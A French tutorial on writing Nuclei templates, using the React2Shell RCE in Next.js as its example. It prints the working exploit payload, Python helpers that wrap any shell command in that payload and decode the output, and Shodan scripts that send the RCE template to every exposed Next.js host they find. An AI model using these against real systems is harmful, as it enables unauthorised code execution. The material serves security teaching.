# Nuclei : maîtriser les templates avec un cas concret sur React2Shell

*De la théorie à la pratique : créer un template de détection et l'intégrer dans un workflow Shodan*

---

## Introduction

Nuclei est devenu un outil incontournable dans l'arsenal des pentesters et des équipes de sécurité offensive. Développé par ProjectDiscovery, ce scanner de vulnérabilités open source se distingue par son approche template-driven : chaque test est décrit dans un fichier YAML déclaratif, ce qui le rend à la fois puissant et accessible.

Cet article va au-delà de la simple présentation de l'outil. Il décortique l'anatomie d'un template, analyse un vrai template de détection pour une vulnérabilité critique récente (React2Shell, CVE-2025-55182), puis intègre le tout dans un workflow réaliste combinant Shodan et Nuclei.

---

## Nuclei : le principe

Nuclei fonctionne sur un modèle simple : une cible et des templates en entrée, des requêtes envoyées selon les définitions des templates, et une analyse des réponses pour détecter vulnérabilités, misconfigurations ou expositions.

Usage basique :

```bash
nuclei -u https://cible.com -t cves/
nuclei -l urls.txt -t exposures/ -t misconfigurations/
nuclei -u https://cible.com -automatic-scan
```

La communauté maintient une bibliothèque de plusieurs milliers de templates dans le repository nuclei-templates, organisés par catégories : cves/, vulnerabilities/, exposures/, misconfigurations/, technologies/, default-logins/, etc.

---

## Anatomie d'un template

Un template Nuclei est un fichier YAML structuré en plusieurs sections. Comprendre cette structure est essentiel pour créer ses propres détections.

### La section info

Cette section contient les métadonnées du template : identifiant unique, nom, auteur, sévérité, description, tags et références (CVE, CWE, liens).

```yaml
id: exemple-detection

info:
  name: Détection de panel admin exposé
  author: auteur
  severity: medium
  description: Détecte une interface d'administration accessible
  tags: admin,exposure,panel
```

### La section de requêtes

Le coeur du template. Nuclei supporte plusieurs protocoles : http, tcp, dns, file, headless, etc. Pour la plupart des cas web, le protocole http est utilisé. Cette section définit la méthode, les chemins à tester, les headers éventuels, et le body pour les requêtes POST.

```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/administrator"
```

Pour les requêtes plus complexes (POST avec body custom, headers spécifiques), le mode `raw` permet de définir la requête HTTP complète :

```yaml
http:
  - raw:
      - |
        POST /api/endpoint HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"key": "value"}
```

### Les matchers

Les matchers définissent les conditions pour qu'une détection soit positive. Nuclei propose plusieurs types :

| Type | Description |
|------|-------------|
| `word` | Recherche de chaînes de caractères dans la réponse |
| `regex` | Patterns d'expressions régulières |
| `status` | Codes de réponse HTTP |
| `binary` | Données binaires en hexadécimal |
| `dsl` | Expressions complexes avec accès aux variables |

```yaml
matchers-condition: and
matchers:
  - type: word
    part: header
    words:
      - "X-Custom-Header"
    condition: or

  - type: status
    status:
      - 200
```

### Les extractors

Les extractors permettent d'extraire des informations de la réponse pour les afficher ou les réutiliser dans des requêtes ultérieures. Particulièrement utile pour extraire des numéros de version ou des tokens.

```yaml
extractors:
  - type: regex
    name: version
    regex:
      - 'version[": ]+([0-9.]+)'
    group: 1
```

---

## Cas pratique : React2Shell (CVE-2025-55182)

### Contexte de la vulnérabilité

React2Shell est une vulnérabilité critique (CVSS 10.0) affectant les React Server Components et le framework Next.js. Découverte par Lachlan Davidson et divulguée le 3 décembre 2025, elle permet une exécution de code à distance (RCE) pré-authentification via une simple requête HTTP.

Le problème réside dans le protocole Flight utilisé par les React Server Components. Une désérialisation non sécurisée des payloads RSC permet à un attaquant d'injecter du code exécuté côté serveur avec les privilèges du processus Node.js.

**Versions affectées :**
- React 19.x (packages react-server-dom-*)
- Next.js 15.x et 16.x avec App Router
- Autres frameworks implémentant RSC : React Router, Waku...

L'exploitation est triviale et a été observée dans la nature dès le 5 décembre 2025, notamment par des groupes APT chinois (Earth Lamia, Jackpot Panda) et des cryptominers opportunistes.

### Le mécanisme d'exploitation

L'attaque exploite la pollution de prototype via le protocole Flight. Le payload malveillant est envoyé dans une requête POST multipart avec un header `Next-Action` spécifique. Structure du payload :

```json
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('COMMAND').toString();throw Object.assign(new Error('x'),{digest: res});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

Le champ `_prefix` contient le code JavaScript exécuté côté serveur. L'astuce consiste à utiliser `execSync` pour exécuter une commande système et récupérer le résultat via le champ `digest` de l'erreur levée.

### Template Nuclei officiel (Assetnote)

Voici le template utilisé par Assetnote pour détecter cette vulnérabilité. Il utilise une technique astucieuse : exécuter un calcul mathématique (`echo $((1337*10001))`) et vérifier que le résultat (`13371337`) apparaît dans la redirection.

```yaml
id: cve-2025-55182-react2shell

info:
  name: Next.js/React Server Components RCE (React2Shell)
  author: assetnote
  severity: critical
  description: |
    Detects CVE-2025-55182 and CVE-2025-66478, a Remote Code Execution 
    vulnerability in Next.js applications using React Server Components.
    It attempts to execute 'echo $((1337*10001))' on the server. 
    If successful, the server returns a redirect to '/login?a=13371337'.
  reference:
    - https://github.com/assetnote/react2shell-scanner
    - https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id:
      - CVE-2025-55182
      - CVE-2025-66478
  tags: cve,cve2025,nextjs,rce,react

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Next-Action: x
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="0"

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $((1337*10001))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="1"

        "$@0"
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="2"

        []
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "/login?a=13371337"
          - "X-Action-Redirect"
        condition: and
```

### Décorticage du template

**Points clés de cette approche :**

1. **Calcul mathématique** : Le payload exécute `echo $((1337*10001))` qui retourne `13371337`. Cette signature unique ne peut pas apparaître par hasard.

2. **Redirection Next.js** : Au lieu de simplement lever une erreur, le payload utilise le mécanisme de redirection natif de Next.js (`NEXT_REDIRECT`). Le résultat du calcul est injecté dans l'URL de redirection.

3. **Double vérification** : Le matcher cherche à la fois l'URL de redirection (`/login?a=13371337`) ET le header `X-Action-Redirect`. Les deux doivent être présents pour confirmer la vulnérabilité.

4. **Absence d'impact** : Ce template ne fait qu'un calcul mathématique et une redirection. Aucun fichier créé, aucune donnée exfiltrée. Détection safe.

### Template de détection passive

Pour identifier les applications Next.js potentiellement vulnérables sans envoyer de payload d'exploitation, voici un template de fingerprinting :

```yaml
id: nextjs-app-router-detect

info:
  name: Next.js App Router Detection
  author: security-researcher
  severity: info
  description: |
    Détecte les applications Next.js utilisant App Router,
    potentiellement vulnérables à CVE-2025-55182.
  reference:
    - https://react2shell.com/
  tags: tech,nextjs,react,fingerprint

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "self\\.__next_f\\.push"
          - "__next_f"
          - "window\\.__next_f"
        condition: or

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: nextjs-build-id
        part: body
        regex:
          - '"buildId":"([a-zA-Z0-9_-]+)"'
        group: 1
```

Ce template cherche les marqueurs spécifiques de l'App Router (`__next_f`, `self.__next_f.push`) indiquant l'utilisation des React Server Components.

---

## Intégration avec Shodan

### Identifier les cibles

Shodan permet d'identifier des applications Next.js exposées sur internet grâce à ses filtres de composants. Requête de base :

```
http.component:"Next.js"
```

Filtres géographiques ou organisationnels :

```
http.component:"Next.js" country:FR
http.component:"Next.js" org:"OVH SAS"
http.component:"Next.js" port:443
```

Pour les utilisateurs de FOFA (équivalent chinois de Shodan) :

```
app="NEXT.JS" || app="React.js"
```

### Exporter et scanner

Une fois les cibles identifiées via Shodan, export et scan avec Nuclei :

```bash
# Exporter les IPs
shodan search --fields ip_str,port 'http.component:"Next.js"' > targets.txt

# Formater pour Nuclei (https://ip:port)
awk '{print "https://" $1 ":" $2}' targets.txt > urls.txt

# Scanner avec le template React2Shell
nuclei -l urls.txt -t cve-2025-55182-react2shell.yaml -o results.txt
```

### Workflow automatisé avec les outils ProjectDiscovery

Pipeline de reconnaissance combinant les outils ProjectDiscovery :

```bash
# Découverte de sous-domaines
subfinder -d example.com -silent | \

# Vérification des hôtes actifs et détection Next.js
httpx -silent -threads 50 -tech-detect | grep -i next | \

# Extraction des URLs
awk '{print $1}' | \

# Scan Nuclei
nuclei -t cve-2025-55182-react2shell.yaml -o vulnerable-nextjs.txt
```

Ce pipeline découvre les sous-domaines d'une cible, vérifie lesquels sont actifs avec httpx (qui détecte aussi les technologies), filtre ceux utilisant Next.js, puis lance le scan Nuclei.

### Script Python d'intégration Shodan

Script automatisant le workflow complet :

```python
#!/usr/bin/env python3
"""
Shodan to Nuclei pipeline for React2Shell detection
"""

import shodan
import subprocess
import sys

SHODAN_API_KEY = "YOUR_API_KEY"

def main():
    api = shodan.Shodan(SHODAN_API_KEY)
    
    query = 'http.component:"Next.js"'
    if len(sys.argv) > 1:
        query += f' country:{sys.argv[1]}'
    
    print(f"[*] Searching Shodan: {query}")
    
    results = api.search(query)
    print(f"[+] Found {results['total']} results")
    
    # Write URLs to file
    with open('targets.txt', 'w') as f:
        for result in results['matches']:
            ip = result['ip_str']
            port = result['port']
            ssl = 'ssl' in result or port == 443
            proto = 'https' if ssl else 'http'
            f.write(f"{proto}://{ip}:{port}\n")
    
    print(f"[*] Wrote {len(results['matches'])} targets to targets.txt")
    
    # Run Nuclei
    print("[*] Running Nuclei scan...")
    subprocess.run([
        'nuclei',
        '-l', 'targets.txt',
        '-t', 'cve-2025-55182-react2shell.yaml',
        '-o', 'vulnerable.txt',
        '-silent'
    ])
    
    print("[+] Scan complete. Check vulnerable.txt for results.")

if __name__ == '__main__':
    main()
```

---

## Comprendre l'exploit en profondeur

Pour une compréhension approfondie du mécanisme d'exploitation, voici les éléments clés extraits d'un framework d'exploitation complet.

### Détection de l'architecture Next.js

Avant exploitation, il est nécessaire de déterminer si l'application utilise l'App Router (vulnérable) ou le Pages Router (non vulnérable) :

```python
def detect_nextjs(url):
    resp = requests.get(url)
    html = resp.text
    
    indicators = {
        'nextjs': False,
        'app_router': False,
        'pages_router': False
    }
    
    # App Router (vulnérable) - présence de __next_f
    if '__next_f' in html or 'self.__next_f' in html:
        indicators['app_router'] = True
    
    # Pages Router (non vulnérable) - présence de __NEXT_DATA__
    if '__NEXT_DATA__' in html:
        indicators['pages_router'] = True
    
    return indicators
```

### Construction du payload

Le payload doit être envoyé dans un format multipart spécifique avec le header `Next-Action: x` :

```python
def build_payload(command):
    boundary = '----WebKitFormBoundary' + ''.join(
        random.choices(string.ascii_letters + string.digits, k=16)
    )
    
    # Escape command for JavaScript
    escaped_cmd = command.replace('\\', '\\\\').replace("'", "\\'")
    
    payload_template = (
        '{{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":'
        '"var res=process.mainModule.require(\'child_process\').execSync(\'{cmd}\').toString(\'base64\');'
        'throw Object.assign(new Error(\'x\'),{{digest: res}});","_chunks":"$Q2",'
        '"_formData":{{"get":"$1:constructor:constructor"}}}}}}'
    )
    
    json_payload = payload_template.format(cmd=escaped_cmd)
    
    form_data = (
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'{json_payload}\r\n'
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name="1"\r\n\r\n'
        '"$@0"\r\n'
        f'--{boundary}\r\n'
        'Content-Disposition: form-data; name="2"\r\n\r\n'
        '[]\r\n'
        f'--{boundary}--\r\n'
    )
    
    return form_data, boundary
```

### Extraction de la sortie

Le résultat de la commande est encodé en base64 et retourné dans le champ `digest` de la réponse :

```python
def extract_output(response_text):
    pattern = r'"digest"\s*:\s*"((?:[^"\\]|\\.)*)"'
    match = re.search(pattern, response_text)
    
    if match:
        raw_b64 = match.group(1)
        clean_b64 = json.loads(f'"{raw_b64}"')
        decoded = base64.b64decode(clean_b64).decode('utf-8')
        return decoded.strip()
    
    return None
```

---

## Considérations éthiques et légales

Scanner des systèmes sans autorisation est illégal dans la plupart des juridictions. L'article 323-1 du Code pénal français punit l'accès frauduleux à un système de traitement automatisé de données de deux ans d'emprisonnement et 60 000 euros d'amende.

Conditions d'utilisation légitimes :

- **Bug bounty** : programme actif avec scope incluant ce type de tests
- **Pentest** : autorisation écrite couvrant les scans de vulnérabilités
- **Recherche** : infrastructures propres ou environnements de lab uniquement
- **Défense** : audit des systèmes sous sa responsabilité

Le fait que Shodan indexe des systèmes publiquement accessibles ne constitue pas une autorisation de les scanner. La détection passive (consultation Shodan) et le scan actif (envoi de requêtes) sont deux choses différentes d'un point de vue légal.

---

## Conclusion

Nuclei est un outil puissant dont la force réside dans son système de templates. Comprendre leur structure permet non seulement d'utiliser efficacement les milliers de templates communautaires, mais aussi de créer ses propres détections adaptées à des contextes spécifiques.

L'exemple React2Shell illustre parfaitement l'intérêt de maîtriser ces outils : face à une vulnérabilité critique fraîchement publiée, pouvoir rapidement analyser un template de détection et l'intégrer dans un workflow de reconnaissance automatisé représente un avantage considérable.

Le couplage avec Shodan ajoute une dimension supplémentaire en permettant d'identifier des cibles à grande échelle avant de les scanner. Ce type de workflow, combinant plusieurs outils spécialisés, caractérise l'approche moderne du pentesting et de la sécurité offensive.

---

## Ressources

- [Documentation Nuclei](https://docs.projectdiscovery.io/tools/nuclei)
- [Repository nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
- [React2Shell](https://react2shell.com/)
- [Analyse Wiz sur CVE-2025-55182](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
- [Assetnote React2Shell Scanner](https://github.com/assetnote/react2shell-scanner)
- [Shodan](https://www.shodan.io/)
- [SLCyber - High Fidelity Detection](https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478)
